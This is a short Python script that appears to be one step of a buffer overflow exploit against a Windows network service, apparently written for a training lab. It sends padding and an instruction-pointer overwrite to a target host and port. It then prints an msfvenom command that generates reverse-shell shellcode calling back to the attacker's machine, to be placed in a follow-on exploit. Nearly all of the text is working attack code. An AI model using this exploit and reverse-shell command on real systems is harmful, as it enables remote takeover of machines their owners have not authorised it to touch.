#!/usr/bin/python3
from details import *
import socket

s = socket.socket()
s.connect((HOST, PORT))
initial(s)

buf = b"A"*OFFSET
nop = b"\x90"*16
end = b"C"*(TOTAL_LENGTH - len(EIP) - len(buf))


payload = [
    PREFIX,
    buf,
    EIP,
    end
]
s.send(b''.join(payload))
s.close()
print("Breakpoint works as you imagined? Let's generate some shellcode.\nmsfvenom -p windows/shell_reverse_tcp -a x86 -f py -b \"\\x00 (and more)\" LHOST=tun0 LPORT=4444\nPut the shellcode in exploit.py.")
